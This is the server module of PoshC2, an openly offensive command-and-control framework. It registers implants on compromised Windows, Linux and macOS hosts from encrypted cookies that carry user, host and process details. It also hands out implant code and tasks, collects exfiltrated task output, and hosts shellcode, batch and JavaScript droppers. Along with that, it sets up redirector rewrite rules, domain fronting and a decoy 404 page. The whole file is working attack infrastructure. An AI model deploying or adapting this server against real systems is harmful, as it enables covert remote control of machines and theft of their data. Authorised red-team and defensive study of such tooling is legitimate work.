#!/usr/bin/env python3

import base64
import os
import shutil
import signal
import ssl
import sys
import threading
import time
import traceback
from datetime import datetime, date, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn

from poshc2 import Colours, logo
from poshc2.Utils import validate_sleep_time, gen_key
from poshc2.server.Cert import create_self_signed_cert
from poshc2.server.Config import DatabaseType, PoshProjectDirectory, ServerHeader, PayloadsDirectory, GET_404_Response, \
    PayloadCommsHost, ResourcesDirectory
from poshc2.server.Config import DownloadURL, URLS, SocksURLS, Insecure, UserAgent, Referer, Pushover_APIToken, UseHttp
from poshc2.server.Config import HostedFileURL, KillDate, DefaultSleep, DomainFrontHeader, urlConfig, BindIP, BindPort
from poshc2.server.Config import Pushover_APIUser, Slack_UserID, Slack_Channel, Slack_BotToken, EnableNotifications
from poshc2.server.Core import decrypt, encrypt, default_response, number_of_days, print_bad, clear, print_good
from poshc2.server.ImplantExtensions import new_implant, display, autoruns
from poshc2.server.ImplantType import ImplantType
from poshc2.server.Tasks import save_task_output, new_task
from poshc2.server.database.Helpers import insert_object, update_object, select_first, select_all, get_new_implant_url, \
    get_unread_messages
from poshc2.server.database.Model import C2Server, URL, HostedFile
from poshc2.server.payloads.Payloads import Payloads

new_implant_url = None
hosted_files = None
hosted_files_url = None
base_encryption_key = None


class MyHandler(BaseHTTPRequestHandler):

    def signal_handler(self, signal, frame):
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def log_message(self, message, *args):
        try:
            useragent = str(self.headers['user-agent'])
        except Exception:
            useragent = "None"

        webserver_log(f"{self.address_string()} - [{self.log_date_time_string()}] {message % args} {useragent}\n")

    def do_HEAD(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_OPTIONS(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_PUT(self):
        """Respond to a PUT request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        try:
            """Respond to a GET request."""
            response_content_len = None
            response_code = 200
            response_content_type = "text/html"
            response_content = None
            hosted_files = select_all(HostedFile)

            webserver_log(f"GET request,\nPath: {str(self.path)}\nHeaders:\n{str(self.headers)}\n")

            self.cookieHeader = self.headers.get('Cookie')
            self.ref = self.headers.get('Referer')

            self.server_version = ServerHeader
            self.sys_version = ""
            if not self.cookieHeader:
                self.cookieHeader = "NONE"

            # implant gets a new task
            task = new_task(self.path)

            if task:
                response_content = task

            # dynamically hosted files
            elif [ele for ele in hosted_files if (ele.uri in self.path)]:
                for hosted_file in hosted_files:
                    if hosted_file.uri == self.path or f"/{hosted_file.uri}" == self.path and hosted_file.active == "Yes":
                        try:
                            response_content = open(hosted_file.file_path, 'rb').read()
                        except FileNotFoundError as e:
                            print_bad(
                                f"Hosted file not found (src_addr: {self.client_address[0]}): {hosted_file.uri} -> {e.filename}")
                        response_content_type = hosted_file.content_type
                        if hosted_file.base64 == "Yes":
                            response_content = base64.b64encode(response_content)

                        # do this for the python dropper only
                        if "_py" in hosted_file.uri:
                            response_content = "a" + "".join("{:02x}".format(c) for c in response_content)
                            response_content = bytes(response_content, "utf-8")

            # register new implant
            elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
                implant_type = ImplantType.PowerShellHttp
                if self.path == f"{new_implant_url}?n":
                    implant_type = ImplantType.UnmanagedHttp
                if self.path == f"{new_implant_url}?p?n":
                    implant_type = ImplantType.UnmanagedHttpProxy
                if self.path == f"{new_implant_url}?p":
                    implant_type = ImplantType.PowerShellHttpProxy
                if self.path == f"{new_implant_url}?d":
                    implant_type = ImplantType.PowerShellHttpDaisy
                if self.path == f"{new_implant_url}?m":
                    implant_type = ImplantType.PythonHttp
                if self.path == f"{new_implant_url}?d?m":
                    implant_type = ImplantType.PythonHttpDaisy
                if self.path == f"{new_implant_url}?p?m":
                    implant_type = ImplantType.PythonHttpProxy
                if self.path == f"{new_implant_url}?c":
                    implant_type = ImplantType.SharpHttp
                if self.path == f"{new_implant_url}?d?c":
                    implant_type = ImplantType.SharpHttpDaisy
                if self.path == f"{new_implant_url}?p?c":
                    implant_type = ImplantType.SharpHttpProxy
                if self.path == f"{new_implant_url}?j":
                    implant_type = ImplantType.JXAHttp
                if self.path == f"{new_implant_url}?e":
                    implant_type = ImplantType.LinuxHttp
                if self.path == f"{new_implant_url}?p?e":
                    implant_type = ImplantType.LinuxHttpProxy

                if implant_type.is_sharp_implant():
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
                    domain, user, hostname, architecture, process_id, process_name, url_id = decrypted_session_cookie.split(
                        ";")
                    url_id = url_id.replace("\x00", "")

                    if "\\" in user:
                        user = user[user.index("\\") + 1:]

                    new_sharp_implant, sharp_updated_config = new_implant(ip_address, implant_type, str(domain),
                                                                          str(user), str(hostname), architecture,
                                                                          process_id,
                                                                          str(process_name).lower().replace(".exe", ""),
                                                                          int(url_id))
                    display(new_sharp_implant)
                    autoruns(new_sharp_implant)
                    response_content = encrypt(base_encryption_key, sharp_updated_config)
                elif implant_type.is_python_implant():
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
                    user, domain, hostname, architecture, process_id, process_name, url_id = decrypted_session_cookie.split(
                        ";")
                    url_id = url_id.replace("\x00", "")
                    new_python_implant, python_core = new_implant(ip_address, implant_type, str(domain), str(user),
                                                                  str(hostname), architecture, process_id,
                                                                  str(process_name).lower(), url_id)
                    display(new_python_implant)
                    response_content = encrypt(base_encryption_key, python_core)

                elif implant_type.is_jxa_implant():
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
                    user, hostname, process_id, process_name, url_id = decrypted_session_cookie.split(";")
                    domain = hostname
                    url_id = url_id.replace("\x00", "")
                    url_id = url_id.replace("\x07", "")
                    new_jxa_implant, jxa_core = new_implant(ip_address, implant_type, str(domain), str(user),
                                                            str(hostname), "x64", process_id, str(process_name).lower(),
                                                            url_id)
                    display(new_jxa_implant)
                    response_content = encrypt(base_encryption_key, jxa_core)

                elif implant_type.is_linux_implant():
                    process_name = "Linux Dropper"
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
                    user, domain, hostname, architecture, process_id, url_id = decrypted_session_cookie.split(";")
                    url_id = url_id.replace("\x00", "")
                    new_linux_implant, linux_core = new_implant(ip_address, implant_type, str(domain), str(user),
                                                                str(hostname), architecture, process_id, process_name,
                                                                url_id)
                    display(new_linux_implant)
                    response_content = encrypt(base_encryption_key, new_implant.linux_core)

                elif implant_type.is_unmanaged_implant():
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"
                    user, domain, hostname, process_name, architecture, process_id, url_id = decrypted_session_cookie.split(";")
                    url_id = url_id.replace("\x00", "")
                    new_unmanaged_implant, unmanaged_core = new_implant(ip_address, implant_type, str(domain), str(user),
                                                                        str(hostname), architecture, process_id,
                                                                        str(process_name).lower().replace(".exe", ""), url_id)
                    display(new_unmanaged_implant)
                    response_content = encrypt(base_encryption_key, unmanaged_core)

                elif implant_type.is_powershell_implant():
                    encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
                    decrypted_session_cookie = decrypt(base_encryption_key, encrypted_session_cookie)
                    decrypted_session_cookie = str(decrypted_session_cookie)
                    domain, user, hostname, architecture, process_id, process_name, url_id = decrypted_session_cookie.split(
                        ";")
                    url_id = url_id.replace("\x00", "")
                    ip_address = f"{self.client_address[0]}:{self.client_address[1]}"

                    if "\\" in str(user):
                        user = user[str(user).index('\\') + 1:]

                    new_powershell_implant, powershell_core = new_implant(ip_address, implant_type, str(domain),
                                                                          str(user), str(hostname), architecture,
                                                                          process_id,
                                                                          str(process_name).lower().replace(".exe", ""),
                                                                          url_id)
                    display(new_powershell_implant)
                    autoruns(new_powershell_implant)
                    response_content = encrypt(base_encryption_key, powershell_core)
                else:
                    raise f"Unknown implant type: {implant_type}"
            else:
                response_code = 404
                HTTPResponsePage = select_first(C2Server.get_404_response)

                if HTTPResponsePage:
                    response_content = bytes(HTTPResponsePage, "utf-8")
                else:
                    response_content = bytes(GET_404_Response, "utf-8")

            # send response
            self.send_response(response_code)
            self.send_header("Content-type", response_content_type)

            if response_content_len is not None:
                self.send_header("Connection", "close")
                self.send_header("Content-Length", response_content_len)

            self.end_headers()

            if response_content is not None:
                self.wfile.write(response_content)

        except Exception as e:
            webserver_log(f"Error handling GET request: {str(e)}\n")
            webserver_log(traceback.format_exc())

    def do_POST(self):
        try:
            """Respond to a POST request."""
            response_code = 200
            response_content_type = "text/html"

            self.server_version = ServerHeader
            self.sys_version = ""
            try:
                content_length = int(self.headers['Content-Length'])
            except ValueError:
                content_length = 0
            self.cookieHeader = self.headers.get('Cookie')
            if self.cookieHeader is not None:
                encrypted_session_cookie = self.cookieHeader.replace("SessionID=", "")
            else:
                encrypted_session_cookie = ""

            post_data = self.rfile.read(content_length)
            webserver_log(
                f"POST request,\nPath: {str(self.path)}\nHeaders:\n{str(self.headers)}\n\nBody:\n{post_data}\n")
            save_task_output(self.path, encrypted_session_cookie, post_data)

            response_content = default_response()

            # send response
            self.send_response(response_code)
            self.send_header("Content-type", response_content_type)
            if len(response_content):
                self.send_header("Connection", "close")
                self.send_header("Content-Length", str(len(response_content)))
            self.end_headers()
            if response_content is not None:
                self.wfile.write(response_content)

        except Exception as e:
            webserver_log("Error handling POST request: " + str(e))
            webserver_log(traceback.format_exc())


ThreadingMixIn.daemon_threads = True


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def new_database():
    print(f"Initializing new project folder and {DatabaseType} database" + Colours.GREEN)
    print()

    if not validate_sleep_time(DefaultSleep):
        print(Colours.RED)
        print("Invalid DefaultSleep in config, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
        sys.exit(1)

    directory = os.path.dirname(PoshProjectDirectory)

    if not os.path.exists(directory):
        os.makedirs(directory)

    if not os.path.exists(f"{directory}/downloads"):
        os.makedirs(f"{directory}/downloads")

    if not os.path.exists(f"{directory}/reports"):
        os.makedirs(f"{directory}/reports")

    if not os.path.exists(f"{directory}/payloads"):
        os.makedirs(f"{directory}/payloads")

    c2_server = C2Server(
        payload_comms_host=PayloadCommsHost,
        encryption_key=gen_key().decode("utf-8"),
        domain_front_header=DomainFrontHeader,
        default_sleep=DefaultSleep,
        kill_date=KillDate,
        get_404_response=GET_404_Response,
        posh_project_directory=PoshProjectDirectory,
        hosted_file_url=HostedFileURL,
        download_url=DownloadURL,
        proxy_url=None,
        proxy_username=None,
        proxy_password=None,
        urls=URLS,
        socks_urls=SocksURLS,
        insecure=Insecure,
        user_agent=UserAgent,
        referer=Referer,
        pushover_api_token=Pushover_APIToken,
        pushover_api_user=Pushover_APIUser,
        slack_user_id=Slack_UserID,
        slack_channel=Slack_Channel,
        slack_bot_token=Slack_BotToken,
        notifications_enabled=EnableNotifications
    )

    insert_object(c2_server)
    rewriteFile = f"{directory}/rewrite-rules.txt"
    print("Creating Rewrite Rules in: " + rewriteFile)
    rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none",
                     "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off",
                     "# Change IPs to point at C2 infrastructure below", "# If running Apache 2.4.52 or Later", "Proxy100Continue Off" "Define PoshC2 10.0.0.1",
                     "Define SharpSocks 10.0.0.1"]
    rewrite_file_contents = rewriteHeader + urlConfig.get_rewrite_rules() + urlConfig.get_socks_rewrite_rules()

    with open(rewriteFile, 'w') as out_file:
        for line in rewrite_file_contents:
            out_file.write(line)
            out_file.write('\n')

    print("Copying urls.txt to the projects folder as a backup")
    shutil.copyfile(f"{ResourcesDirectory}/urls.txt", f"{PoshProjectDirectory}/urls.txt")

    url = URL(
        name="default",
        url=c2_server.payload_comms_host,
        host_header=c2_server.domain_front_header,
        proxy_url=None,
        proxy_username=None,
        proxy_password=None,
        credential_expiry=None
    )

    insert_object(url)

    new_payload = Payloads(c2_server.kill_date, c2_server.encryption_key, c2_server.insecure, c2_server.user_agent,
                           c2_server.referer, get_new_implant_url(), PayloadsDirectory,
                           url_id=url.id)
    new_payload.create_all()
    create_self_signed_cert(PoshProjectDirectory)
    new_payload.write_quickstart_log(directory + '/quickstart.txt')
    add_default_hosted_payloads()

    return c2_server


def existing_database(c2_server):
    print(f"Using existing {DatabaseType} database / project" + Colours.GREEN)

    if (c2_server.payload_comms_host == PayloadCommsHost) and (c2_server.domain_front_header == DomainFrontHeader):
        qstart = f"{PoshProjectDirectory}quickstart.txt"

        if os.path.exists(qstart):
            with open(qstart, 'r') as f:
                print(f.read())
    else:
        print(Colours.YELLOW + "\nModified config detected! Regenerating payloads...")

        if os.path.exists(f"{PoshProjectDirectory}payloads_old"):
            shutil.rmtree(f"{PoshProjectDirectory}payloads_old")

        os.rename(f"{PoshProjectDirectory}payloads", f"{PoshProjectDirectory}payloads_old")
        os.makedirs(f"{PoshProjectDirectory}payloads")
        update_object(C2Server, {C2Server.payload_comms_host: PayloadCommsHost, C2Server.hosted_file_url: HostedFileURL,
                                 C2Server.domain_front_header: DomainFrontHeader})

        url = URL(
            name=f"updated_host-{datetime.strftime(datetime.now(timezone.utc), '%Y-%m-%d-%H:%M:%S')}",
            url=c2_server.payload_comms_host,
            host_header=c2_server.domain_front_header,
            proxy_url=None,
            proxy_username=None,
            proxy_password=None,
            credential_expiry=None
        )

        insert_object(url)

        new_payload = Payloads(c2_server.kill_date, c2_server.encryption_key, c2_server.insecure, c2_server.user_agent,
                               c2_server.referer, get_new_implant_url(), PayloadsDirectory,
                               url_id=url.id)
        new_payload.create_all()
        new_payload.write_quickstart_log(PoshProjectDirectory + 'quickstart.txt')
        add_default_hosted_payloads()


def add_default_hosted_payloads():
    # adding default hosted payloads
    hosted_file_url = select_first(C2Server.hosted_file_url)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}s/86/portal",
        file_path=f"{PayloadsDirectory}Sharp_v4_x86_Shellcode.bin",
        content_type="text/html",
        base64="Yes",
        active="Yes"
    )

    insert_object(hosted_file)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}s/64/portal",
        file_path=f"{PayloadsDirectory}Sharp_v4_x64_Shellcode.bin",
        content_type="text/html",
        base64="Yes",
        active="Yes"
    )

    insert_object(hosted_file)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}_bs",
        file_path=f"{PayloadsDirectory}payload.bat",
        content_type="text/html",
        base64="No",
        active="Yes"
    )

    insert_object(hosted_file)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}_rp",
        file_path=f"{PayloadsDirectory}payload.txt",
        content_type="text/html",
        base64="Yes",
        active="Yes"
    )

    insert_object(hosted_file)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}_cs",
        file_path=f"{PayloadsDirectory}Posh_v4_DotNet2JS.js",
        content_type="text/html",
        base64="No",
        active="Yes"
    )

    insert_object(hosted_file)

    hosted_file = HostedFile(
        uri=f"{hosted_file_url}_py",
        file_path=f"{PayloadsDirectory}aes.py",
        content_type="text/html",
        base64="No",
        active="Yes"
    )

    insert_object(hosted_file)


def log_c2_messages():
    while True:
        unreads = get_unread_messages()

        if unreads:
            for unread in unreads:
                print(unread.message)

        time.sleep(2)


def webserver_log(message):
    open(f"{PoshProjectDirectory}webserver.log", "a").write(message)


def main(args):
    httpd = ThreadedHTTPServer((BindIP, BindPort), MyHandler)
    global new_implant_url, hosted_files, base_encryption_key, hosted_files_url

    clear()
    print(chr(27) + "[2J")
    print_good(logo)

    C2 = select_first(C2Server);

    try:
        if C2:
            if len(os.listdir(PoshProjectDirectory)) > 2:
                existing_database(C2)
            else:
                print(Colours.RED + "[-] Project directory does not exist or is empty \n")
                print(Colours.RED + f"[>] Create new DB and remove dir ({PoshProjectDirectory}) \n")
                sys.exit(1)
        else:
            C2 = new_database()
    except Exception as e:
        print(str(e))
        traceback.print_exc()
        print(Colours.RED + f"[>] Create new DB and remove dir ({PoshProjectDirectory}) \n")
        sys.exit(1)

    print("" + Colours.GREEN)
    new_implant_url = get_new_implant_url()
    print("STAGE URI: " + new_implant_url + Colours.GREEN)
    hosted_files_url = select_first(C2Server.hosted_file_url)
    print("HOSTED FILE URLI: " + hosted_files_url + Colours.GREEN)
    print(f"WEBSERVER Log: {PoshProjectDirectory}webserver.log")
    print("")
    print("Comms Domains: " + select_first(C2Server.payload_comms_host) + Colours.GREEN)
    print("HTTP Host Headers: " + select_first(C2Server.domain_front_header) + Colours.GREEN)
    base_encryption_key = select_first(C2Server.encryption_key)
    hosted_files = select_all(HostedFile)
    print("")
    print(time.asctime() + f" PoshC2 Server Started - {BindIP}:{BindPort}")
    kill_date = datetime.strptime(C2.kill_date, '%Y-%m-%d').date()
    date_difference = number_of_days(date.today(), kill_date)

    if date_difference < 8:
        print(Colours.RED + f"\nKill Date is - {C2.kill_date} - expires in {date_difference} days")
    else:
        print(Colours.GREEN + f"\nKill Date is - {C2.kill_date} - expires in {date_difference} days")

    print(Colours.END)

    if not UseHttp:
        cert_file = f"{PoshProjectDirectory}posh.crt"
        key_file = f"{PoshProjectDirectory}posh.key"
        
        if (os.path.isfile(cert_file)) and (os.path.isfile(key_file)):
            try: 
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                ssl_context.load_cert_chain(cert_file, key_file)
                httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True) 
            except Exception:
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                ssl_context.load_cert_chain(cert_file, key_file)
                httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
        else:
            raise ValueError("Cannot find the certificate files")

    c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
    c2_message_thread.start()

    try:
        httpd.serve_forever()
    except (KeyboardInterrupt, EOFError):
        httpd.server_close()
        print(time.asctime() + f" PoshC2 Server Stopped - {BindIP}:{BindPort}")
        sys.exit(0)


if __name__ == '__main__':
    args = sys.argv
    main(args)
